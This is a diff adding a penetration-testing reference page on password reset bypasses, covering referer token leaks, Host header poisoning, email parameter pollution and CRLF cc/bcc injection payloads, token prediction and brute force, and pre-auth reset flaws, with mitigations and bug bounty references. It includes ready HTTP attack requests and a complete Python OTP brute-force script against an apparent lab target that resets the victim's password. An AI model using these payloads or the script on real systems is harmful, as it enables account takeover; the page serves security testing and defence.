@@ -1,0 +1,301 @@
+# Reset/Forgotten Password Bypass
+
+## **Password Reset Token Leak Via Referrer**
+
+- The HTTP referer header may leak the password reset token if it's included in the URL. This can occur when a user clicks on a third-party website link after requesting a password reset.
+- **Impact**: Potential account takeover via Cross-Site Request Forgery (CSRF) attacks.
+- **Exploitation**: To check if a password reset token is leaking in the referer header, **request a password reset** to your email address and **click the reset link** provided. **Do not change your password** immediately. Instead, **navigate to a third-party website** (like Facebook or Twitter) while **intercepting the requests using Burp Suite**. Inspect the requests to see if the **referer header contains the password reset token**, as this could expose sensitive information to third parties.
+- **References**:
+  - [HackerOne Report 342693](https://hackerone.com/reports/342693)
+  - [HackerOne Report 272379](https://hackerone.com/reports/272379)
+  - [Password Reset Token Leak Article](https://medium.com/@rubiojhayz1234/toyotas-password-reset-token-and-email-address-leak-via-referer-header-b0ede6507c6a)
+
+## **Password Reset Poisoning**
+
+- Attackers may manipulate the Host header during password reset requests to point the reset link to a malicious site.
+- **Impact**: Leads to potential account takeover by leaking reset tokens to attackers.
+- **Mitigation Steps**:
+  - Validate the Host header against a whitelist of allowed domains.
+  - Use secure, server-side methods to generate absolute URLs.
+  - **Patch**: Use `$_SERVER['SERVER_NAME']` to construct password reset URLs instead of `$_SERVER['HTTP_HOST']`.
+- **References**:
+  - [Acunetix Article on Password Reset Poisoning](https://www.acunetix.com/blog/articles/password-reset-poisoning/)
+
+## **Password Reset By Manipulating Email Parameter**
+
+Attackers can manipulate the password reset request by adding additional email parameters to divert the reset link.
+
+- Add attacker email as second parameter using &
+
+```php
+POST /resetPassword
+[...]
+email=victim@email.com&email=attacker@email.com
+```
+
+- Add attacker email as second parameter using %20
+
+```php
+POST /resetPassword
+[...]
+email=victim@email.com%20email=attacker@email.com
+```
+
+- Add attacker email as second parameter using |
+
+```php
+POST /resetPassword
+[...]
+email=victim@email.com|email=attacker@email.com
+```
+
+- Add attacker email as second parameter using cc
+
+```php
+POST /resetPassword
+[...]
+email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
+```
+
+- Add attacker email as second parameter using bcc
+
+```php
+POST /resetPassword
+[...]
+email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
+```
+
+- Add attacker email as second parameter using ,
+
+```php
+POST /resetPassword
+[...]
+email="victim@mail.tld",email="attacker@mail.tld"
+```
+
+- Add attacker email as second parameter in json array
+
+```php
+POST /resetPassword
+[...]
+{"email":["victim@mail.tld","atracker@mail.tld"]}
+```
+
+- **Mitigation Steps**:
+  - Properly parse and validate email parameters server-side.
+  - Use prepared statements or parameterized queries to prevent injection attacks.
+- **References**:
+  - [https://medium.com/@0xankush/readme-com-account-takeover-bugbounty-fulldisclosure-a36ddbe915be](https://medium.com/@0xankush/readme-com-account-takeover-bugbounty-fulldisclosure-a36ddbe915be)
+  - [https://ninadmathpati.com/2019/08/17/how-i-was-able-to-earn-1000-with-just-10-minutes-of-bug-bounty/](https://ninadmathpati.com/2019/08/17/how-i-was-able-to-earn-1000-with-just-10-minutes-of-bug-bounty/)
+  - [https://twitter.com/HusseiN98D/status/1254888748216655872](https://twitter.com/HusseiN98D/status/1254888748216655872)
+
+## **Changing Email And Password of any User through API Parameters**
+
+- Attackers can modify email and password parameters in API requests to change account credentials.
+
+```php
+POST /api/changepass
+[...]
+("form": {"email":"victim@email.tld","password":"12345678"})
+```
+
+- **Mitigation Steps**:
+  - Ensure strict parameter validation and authentication checks.
+  - Implement robust logging and monitoring to detect and respond to suspicious activities.
+- **Reference**:
+  - [Full Account Takeover via API Parameter Manipulation](https://medium.com/@adeshkolte/full-account-takeover-changing-email-and-password-of-any-user-through-api-parameters-3d527ab27240)
+
+## **No Rate Limiting: Email Bombing**
+
+- Lack of rate limiting on password reset requests can lead to email bombing, overwhelming the user with reset emails.
+- **Mitigation Steps**:
+  - Implement rate limiting based on IP address or user account.
+  - Use CAPTCHA challenges to prevent automated abuse.
+- **References**:
+  - [HackerOne Report 280534](https://hackerone.com/reports/280534)
+
+## **Find out How Password Reset Token is Generated**
+
+- Understanding the pattern or method behind token generation can lead to predicting or brute-forcing tokens. Some options:
+  - Based Timestamp
+  - Based on the UserID
+  - Based on email of User
+  - Based on Firstname and Lastname
+  - Based on Date of Birth
+  - Based on Cryptography
+- **Mitigation Steps**:
+  - Use strong, cryptographic methods for token generation.
+  - Ensure sufficient randomness and length to prevent predictability.
+- **Tools**: Use Burp Sequencer to analyze the randomness of tokens.
+
+## **Guessable UUID**
+
+- If UUIDs (version 1) are guessable or predictable, attackers may brute-force them to generate valid reset tokens. Check:
+
+- **Mitigation Steps**:
+  - Use GUID version 4 for randomness or implement additional security measures for other versions.
+- **Tools**: Use [guidtool](https://github.com/intruder-io/guidtool) for analyzing and generating GUIDs.
+
+## **Response Manipulation: Replace Bad Response With Good One**
+
+- Manipulating HTTP responses to bypass error messages or restrictions.
+- **Mitigation Steps**:
+  - Implement server-side checks to ensure response integrity.
+  - Use secure communication channels like HTTPS to prevent man-in-the-middle attacks.
+- **Reference**:
+  - [Critical Bug in Live Bug Bounty Event](https://medium.com/@innocenthacker/how-i-found-the-most-critical-bug-in-live-bug-bounty-event-7a88b3aa97b3)
+
+## **Using Expired Token**
+
+- Testing whether expired tokens can still be used for password reset.
+- **Mitigation Steps**:
+  - Implement strict token expiration policies and validate token expiry server-side.
+
+## **Brute Force Password Reset Token**
+
+- Attempting to brute-force the reset token using tools like Burpsuite and IP-Rotator to bypass IP-based rate limits.
+- **Mitigation Steps**:
+  - Implement robust rate-limiting and account lockout mechanisms.
+  - Monitor for suspicious activities indicative of brute-force attacks.
+
+## **Try Using Your Token**
+
+- Testing if an attacker's reset token can be used in conjunction with the victim's email.
+- **Mitigation Steps**:
+  - Ensure that tokens are bound to the user session or other user-specific attributes.
+
+## **Session Invalidation in Logout/Password Reset**
+
+- Ensuring that sessions are invalidated when a user logs out or resets their password.
+- **Mitigation Steps**:
+  - Implement proper session management, ensuring that all sessions are invalidated upon logout or password reset.
+
+## **Session Invalidation in Logout/Password Reset**
+
+- Reset tokens should have an expiration time after which they become invalid.
+- **Mitigation Steps**:
+  - Set a reasonable expiration time for reset tokens and strictly enforce it server-side.
+
+## **OTP rate limit bypass by changing your session**  
+
+- If the website is using user session to track wrong OTP attempts and the OTP was weak ( <= 4 digits) then we can effectively bruteforce the OTP.
+    - **exploitation**:
+        - just request a new session token after getting blocked by the server.
+    - **Example** code that exploits this bug by randomly guessing the OTP (when you change the session the OTP will change as well, and so we will not be able to sequentially bruteforce it!):
+
+      ``` python
+        # Authentication bypass by password reset
+        # by coderMohammed
+        import requests
+        import random
+        from time import sleep
+        
+        headers = {
+            "User-Agent": "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
+            "Cookie": "PHPSESSID=mrerfjsol4t2ags5ihvvb632ea"
+        }
+        url = "http://10.10.12.231:1337/reset_password.php"
+        logout = "http://10.10.12.231:1337/logout.php"
+        root = "http://10.10.12.231:1337/"
+        
+        parms = dict()
+        ter = 0
+        phpsessid = ""
+        
+        print("[+] Starting attack!")
+        sleep(3)
+        print("[+] This might take around 5 minutes to finish!")
+        
+        try:
+                while True:
+                        parms["recovery_code"] = f"{random.randint(0, 9999):04}" # random number from 0 - 9999 with 4 d
+                        parms["s"] = 164 # not important it only efects the frontend
+                        res = requests.post(url, data=parms, allow_redirects=True, verify=False, headers=headers)
+        
+                        if ter == 8: # follow number of trails
+                                out = requests.get(logout,headers=headers) # log u out 
+                                mainp = requests.get(root) # gets another phpssid (token)
+        
+                                cookies = out.cookies # extract the sessionid 
+                                phpsessid = cookies.get('PHPSESSID')
+                                headers["cookies"]=f"PHPSESSID={phpsessid}" #update the headers with new session
+        
+                                reset = requests.post(url, data={"email":"tester@hammer.thm"}, allow_redirects=True, verify=False, headers=headers) # sends the email to change the password for
+                                ter = 0 # reset ter so we get a new session after 8 trails
+                        else:
+                                ter += 1
+                                if(len(res.text) == 2292): # this is the length of the page when u get the recovery code correctly (got by testing)
+                                        print(len(res.text)) # for debug info
+                                        print(phpsessid) 
+        
+                                        reset_data = { # here we will change the password to somthing new 
+                                        "new_password": "D37djkamd!",
+                                        "confirm_password": "D37djkamd!"
+                                        }
+                                        reset2 = requests.post(url, data=reset_data, allow_redirects=True, verify=False, headers=headers)
+        
+                                        print("[+] Password has been changed to:D37djkamd!")
+                                        break 
+        except Exception as e:
+                print("[+] Attck stopped")
+      ```
+
+## Arbitrary password reset via skipOldPwdCheck (pre-auth)
+
+Some implementations expose a password change action that calls the password-change routine with skipOldPwdCheck=true and does not verify any reset token or ownership. If the endpoint accepts an action parameter like change_password and a username/new password in the request body, an attacker can reset arbitrary accounts pre-auth.
+
+Vulnerable pattern (PHP):
+
+```php
+// hub/rpwd.php
+RequestHandler::validateCSRFToken();
+$RP = new RecoverPwd();
+$RP->process($_REQUEST, $_POST);
+
+// modules/Users/RecoverPwd.php
+if ($request['action'] == 'change_password') {
+  $body = $this->displayChangePwd($smarty, $post['user_name'], $post['confirm_new_password']);
+}
+
+public function displayChangePwd($smarty, $username, $newpwd) {
+  $current_user = CRMEntity::getInstance('Users');
+  $current_user->id = $current_user->retrieve_user_id($username);
+  // ... criteria checks omitted ...
+  $current_user->change_password('oldpwd', $_POST['confirm_new_password'], true, true); // skipOldPwdCheck=true
+  emptyUserAuthtokenKey($this->user_auth_token_type, $current_user->id);
+}
+```
+
+Exploitation request (concept):
+
+```http
+POST /hub/rpwd.php HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+action=change_password&user_name=admin&confirm_new_password=NewP@ssw0rd!
+```
+
+Mitigations:
+- Always require a valid, time-bound reset token bound to the account and session before changing a password.
+- Never expose skipOldPwdCheck paths to unauthenticated users; enforce authentication for regular password changes and verify the old password.
+- Invalidate all active sessions and reset tokens after a password change.
+
+## Registration-as-Password-Reset (Upsert on Existing Email)
+
+Some applications implement the signup handler as an upsert. If the email already exists, the handler silently updates the user record instead of rejecting the request. When the registration endpoint accepts a minimal JSON body with an existing email and a new password, it effectively becomes a pre-auth password reset without any ownership verification allowing full account takeover.
+
+Pre-auth ATO PoC (overwriting an existing user's password):
+
+```http
+POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
+Host: www.target.tld
+Content-Type: application/json
+
+{"email":"victim@example.com","password":"New@12345"}
+```
+
+## References
+
+- [https://anugrahsr.github.io/posts/10-Password-reset-flaws/#10-try-using-your-token](https://anugrahsr.github.io/posts/10-Password-reset-flaws/#10-try-using-your-token)
+- [https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
+- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
